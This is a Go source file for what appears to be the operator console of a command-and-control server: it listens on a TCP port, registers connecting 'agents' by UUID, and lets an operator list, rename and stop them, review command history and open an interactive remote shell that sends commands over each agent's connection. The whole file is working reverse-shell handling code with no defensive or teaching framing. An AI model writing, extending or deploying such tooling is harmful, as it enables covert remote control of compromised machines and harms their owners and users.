package gopStation

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"text/tabwriter"
	"time"

	"github.com/google/uuid"
)

type agentStruct struct {
	name      string
	address   string
	startTime time.Time
	Uuid      uuid.UUID
	conn      net.Conn
	commands  []commandStruct
}

type commandStruct struct {
	input  string
	output string
}

func RunServerCmd(host string, port string) {
	agentList := map[uuid.UUID]*agentStruct{}

	address := fmt.Sprintf("%s:%s", host, port)
	fmt.Println("[+] Binding to ", address)

	listener, err := net.Listen("tcp", address)
	if err != nil {
		log.Fatal("[!] Unable to bind the address")
	}
	defer listener.Close()

	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-c
	}()

	go func(listener net.Listener) {
		for {
			agentConn, err := listener.Accept()
			if err != nil {
				log.Println(err)
			}

			agentUuid := uuid.New()
			agentDate := time.Now()

			agentList[agentUuid] = &agentStruct{
				name:      "Undefined",
				address:   agentConn.RemoteAddr().String(),
				startTime: agentDate,
				Uuid:      agentUuid,
				conn:      agentConn,
			}
			fmt.Printf("\n[+] Accepting connection from %s with UUID %s\n", agentConn.RemoteAddr().String(), agentUuid.String())
		}
	}(listener)

	var currentAgent *agentStruct = nil

	reader := bufio.NewReader(os.Stdin)

	for {
		if currentAgent != nil {
			fmt.Printf("%s > ", currentAgent.Uuid.String())
		} else {
			fmt.Printf("$> ")
		}

		input, _ := reader.ReadString('\n')
		// convert CRLF to LF
		input = strings.Replace(input, "\n", "", -1)
		commands := strings.Split(strings.TrimSpace(input), " ")

		if currentAgent != nil {
			switch commands[0] {
			case "help":
				displayHelp()
				continue
			case "shell":
				runShell(currentAgent)
				continue
			case "back":
				currentAgent = nil
				continue
			case "stop":
				currentAgent.conn.Close()
				delete(agentList, currentAgent.Uuid)
				currentAgent = nil
				continue
			case "name":
				if len(commands) < 2 {
					fmt.Print("\n[!] Please provide a name\n")
					continue
				}
				currentAgent.name = strings.Join(commands[1:], " ")
				continue
			case "info":
				w := tabwriter.NewWriter(os.Stdout, 16, 2, 2, ' ', 0)
				fmt.Fprintf(w, "UUID :\t%s\n", currentAgent.Uuid.String())
				fmt.Fprintf(w, "Name :\t%s\n", currentAgent.name)
				fmt.Fprintf(w, "Address :\t%s\n", currentAgent.address)
				fmt.Fprintf(w, "Date :\t%s\n", currentAgent.startTime.Format("2006-01-02 03:04:05"))
				w.Flush()
				continue
			case "history":
				if len(commands) == 1 {
					w := tabwriter.NewWriter(os.Stdout, 16, 2, 2, ' ', 0)
					fmt.Fprint(w, "#\tCommand\n")
					for i, elem := range currentAgent.commands {
						fmt.Fprintf(w, "%d\t%s\n", i, elem.input)
					}
					w.Flush()
				} else {
					targetCmd, err := strconv.Atoi(commands[1])
					if err != nil {
						fmt.Print("\n[!] Please provide a valid number\n")
						continue
					}
					if targetCmd > len(currentAgent.commands) || targetCmd < 0 {
						fmt.Print("\n[!] Please provide a valid number\n")
						continue
					}
					cmd := currentAgent.commands[targetCmd]
					fmt.Printf("> %s\n%s\n", cmd.input, cmd.output)
				}
				continue
			default:
				continue
			}
		} else {
			switch commands[0] {
			case "help":
				displayHelp()
			case "list":
				w := tabwriter.NewWriter(os.Stdout, 36, 2, 2, ' ', 0)
				fmt.Fprint(w, "UUID\tName\tAddress\tStart date\n")
				for _, agent := range agentList {
					fmt.Fprintf(w, "%s\t%s\t%s\t%s\n", agent.Uuid.String(),
						agent.name, agent.address,
						agent.startTime.Format("2006-01-02 03:04:05"))
				}
				w.Flush()
				continue
			case "use":
				if len(commands) < 2 {
					fmt.Print("\n[!] Please provide a UUID\n")
					continue
				}
				targetUuid, err := uuid.Parse(commands[1])
				if err != nil {
					fmt.Printf("\n[!] Error parsing UUID %s\n", targetUuid)
					continue
				}

				agent, present := agentList[targetUuid]
				if !present {
					fmt.Printf("\n[!] Could not find UUID %s\n", targetUuid)
					continue
				}
				currentAgent = agent
				continue
			case "name":
				if len(commands) < 2 {
					fmt.Print("\n[!] Please provide a UUID\n")
					continue
				}
				if len(commands) < 3 {
					fmt.Print("\n[!] Please provide a new name\n")
					continue
				}
				targetUuid, err := uuid.Parse(commands[1])
				if err != nil {
					fmt.Printf("\n[!] Error parsing UUID %s\n", targetUuid)
					continue
				}

				agent, present := agentList[targetUuid]
				if !present {
					fmt.Printf("\n[!] Could not find UUID %s\n", targetUuid)
					continue
				}
				agent.name = strings.Join(commands[2:], " ")
				continue
			case "stop":
				if len(commands) < 2 {
					fmt.Print("\n[!] Please provide a UUID\n")
					continue
				}
				targetUuid, err := uuid.Parse(commands[1])
				if err != nil {
					fmt.Printf("\n[!] Error parsing UUID %s\n", targetUuid)
					continue
				}

				agent, present := agentList[targetUuid]
				if !present {
					fmt.Printf("\n[!] Could not find UUID %s\n", targetUuid)
					continue
				}
				agent.conn.Close()
				delete(agentList, agent.Uuid)
				currentAgent = nil
				continue
			case "exit":
				for _, agent := range agentList {
					agent.conn.Close()
				}
				os.Exit(0)
				continue
			default:
				continue
			}
		}
	}
}

func displayHelp() {
	fmt.Printf("[+] Help from main\n")
	fmt.Printf("\t- help\tDisplay this help\n")
	fmt.Printf("\t- list\tGet a list of all the agents\n")
	fmt.Printf("\t- use [agent]\tSelect an agent based on its UUID\n")
	fmt.Printf("\t- stop [agent]\tStop specified agent by its UUID\n")
	fmt.Printf("\t- name [agent] [name]\tRename specified agent by its UUID\n")
	fmt.Printf("\t- exit\texit\n")

	fmt.Printf("\n[+] Help from an agent\n")
	fmt.Printf("\t- help\tDisplay this help\n")
	fmt.Printf("\t- shell\tRun a shell inside\n")
	fmt.Printf("\t- back\treturn to main menu from the agent\n")
	fmt.Printf("\t- stop\tStop the agent and close the connection\n")
	fmt.Printf("\t- name [name]\tChange name of the agent\n")
	fmt.Printf("\t- history\tDisplay all the command executed into the agent\n")
	fmt.Printf("\t- history [id]\tDisplay input and output of the command \"id\"\n")
	fmt.Printf("\t- info\tGet information about the current agent\n")

	fmt.Printf("\n[+] Help from an agent shell\n")
	fmt.Printf("\t- !help\tDisplay this help\n")
	fmt.Printf("\t- !back\treturn to the agent\n")
}

func runShell(currentAgent *agentStruct) {

	go io.Copy(os.Stdout, currentAgent.conn)

	for {
		reader := bufio.NewReader(os.Stdin)
		input, _ := reader.ReadString('\n')
		// convert CRLF to LF
		input = strings.Replace(input, "\n", "", -1)
		command := strings.TrimSpace(input)
		commandSlice := strings.Split(command, " ")

		switch commandSlice[0] {
		case "!help":
			displayHelp()
			continue
		case "exit":
			fmt.Println("[?] If you want to exit, please use !back and close the connection with the stop command.")
			continue
		case "!back":
			return
		default:
			if command == "" {
				continue
			}

			_, err := io.WriteString(currentAgent.conn, command+"\n")
			if err != nil {
				fmt.Println(err)
				return
			}

			currentAgent.commands = append(currentAgent.commands, commandStruct{
				input:  command,
				output: "",
			})

			// io.Copy(conn, command)
			continue
		}
	}
}
